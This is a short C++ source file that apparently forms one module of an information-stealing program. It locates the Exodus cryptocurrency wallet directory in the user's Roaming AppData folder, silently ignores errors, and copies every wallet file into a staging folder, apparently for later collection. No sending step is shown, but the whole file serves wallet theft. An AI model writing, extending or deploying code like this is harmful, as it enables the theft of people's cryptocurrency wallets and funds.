//
// Created by TERETERY on 07.06.2024.
//

#include "Exodus.h"

static const fs::path EXODUS_PATH = Utils::getRoamingPath() / "Exodus" / "exodus.wallet";

void Exodus::execute(fs::path &root) {
    std::vector<fs::path> paths = Exodus::exodusFiles();

    if(paths.empty())
        return;

    fs::path dst = root / "Exodus";
    fs::create_directories(dst);

    for(fs::path &path : paths)
    {
        Utils::copy(path, dst);
    }
}

std::vector<fs::path> Exodus::exodusFiles() {
    std::vector<fs::path> paths;
    try
    {
        for (const auto& entry : fs::directory_iterator(EXODUS_PATH)) {
            const fs::path& item_path = entry.path();
            std::string item_path_str = item_path.string();

            paths.push_back(item_path);
        }
    }
    catch (const fs::filesystem_error& ignored) {}

    return paths;
}
